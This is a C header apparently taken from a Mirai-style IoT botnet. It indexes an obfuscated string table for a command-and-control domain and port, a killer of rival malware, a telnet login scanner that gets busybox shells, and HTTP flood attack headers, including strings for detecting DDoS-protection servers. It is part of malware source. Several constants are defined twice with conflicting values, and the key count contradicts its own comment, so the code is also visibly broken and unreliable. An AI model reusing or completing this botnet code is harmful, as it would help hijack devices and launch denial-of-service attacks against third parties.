#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

/* Generic bot info */
#define TABLE_PROCESS_ARGV              1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4
          
/* Killer data */          
#define TABLE_KILLER_SAFE               5
#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_DELETED            8   /* " (deleted)" */
#define TABLE_KILLER_FD                 9   /* "/fd" */
#define TABLE_KILLER_ANIME              10  /* .anime */
#define TABLE_KILLER_STATUS             11
#define TABLE_MEM_QBOT                  12
#define TABLE_MEM_QBOT2                 13
#define TABLE_MEM_QBOT3                 14
#define TABLE_MEM_UPX                   15
#define TABLE_MEM_ZOLLARD               16
#define TABLE_MEM_REMAITEN              17
#define TABLE_KILLER_LOLI				18 /* .loli path */
 
/* Scanner data */          
#define TABLE_SCAN_CB_DOMAIN            19  /* domain to connect to */
#define TABLE_SCAN_CB_PORT              20  /* Port to connect to */
#define TABLE_SCAN_SHELL                21  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE               22  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM               23  /* 'system' to enable shell access */
#define TABLE_SCAN_SH                   24  /* 'sh' to enable shell access */
#define TABLE_SCAN_QUERY                25  /* echo hex string to verify login */
#define TABLE_SCAN_RESP                 26  /* utf8 version of query string */
#define TABLE_SCAN_NCORRECT             27  /* 'ncorrect' to fast-check for invalid password */
#define TABLE_SCAN_PS                   28  /* "/bin/busybox ps" */
#define TABLE_SCAN_KILL_9               29  /* "/bin/busybox kill -9 " */
          
/* Attack strings */          
#define TABLE_ATK_RESOLVER              30  /* /etc/resolv.conf */
#define TABLE_ATK_NSERV                 31  /* "nameserver " */

#define TABLE_ATK_KEEP_ALIVE            32  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                33  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            34  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          35  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            36  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           37  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          38  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        39  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    40  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 41  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               42  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        43  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        44  // "connection:"
#define TABLE_ATK_DOSARREST             45  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      46  // "server: cloudflare-nginx"

/* User agent strings */
#define TABLE_HTTP_1                  	47
#define TABLE_HTTP_2                  	48
#define TABLE_HTTP_3                	49
#define TABLE_HTTP_4                 	50
#define TABLE_HTTP_5                 	51
#define TABLE_HTTP_6                 	52
#define TABLE_HTTP_7                 	53
#define TABLE_HTTP_8                 	54
#define TABLE_HTTP_9                 	55
#define TABLE_HTTP_10                 	56
#define TABLE_HTTP_11                 	57
#define TABLE_HTTP_12                 	58
#define TABLE_HTTP_13                 	59
#define TABLE_HTTP_14                 	60
#define TABLE_HTTP_15                 	61

// Clear Buffer Strings
#define PROC_SELF_EXE 				    62
#define PROC_SELF_COMM 					63
#define PROC_SELF_CMDLINE				64


#define TABLE_KILLER_PASS 65
#define TABLE_KILLER_UPX 66
#define TABLE_KILLER_CWD 67
#define TABLE_KILLER_VAR_TMP 68 
#define TABLE_KILLER_VAR 69
#define TABLE_KILLER_PROC    70
#define TABLE_KILLER_EXE     71
#define TABLE_KILLER_DELETED 72
#define TABLE_KILLER_FD      73
#define TABLE_KILLER_ANIME   74
#define TABLE_KILLER_STATUS  75
#define TABLE_KILLER_MAPS 76
#define TABLE_KILLER_TCP 77
#define TABLE_KILLER_REP1 78
#define TABLE_KILLER_REP2 79
#define TABLE_KILLER_REP3 80
#define TABLE_KILLER_REP4 81
#define TABLE_KILLER_REP5 82
#define TABLE_KILLER_REP6 83
#define TABLE_KILLER_REP7 84
#define TABLE_KILLER_REP8 85
#define TABLE_KILLER_REP9 86
#define TABLE_KILLER_REP10 87   
#define TABLE_KILLER_ELF 88
#define TABLE_ATK_VSE    89  /* TSource Engine Query */


// KILLER
#define TABLE_SCAN_LINUXSHELL 90
#define TABLE_SCAN_OGIN		  91
#define TABLE_SCAN_ENTER	  92
#define TABLE_SCAN_ASSWORD    93
#define CLEAR_EXEC_SUCCESS    94


#define TABLE_MAX_KEYS  94 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
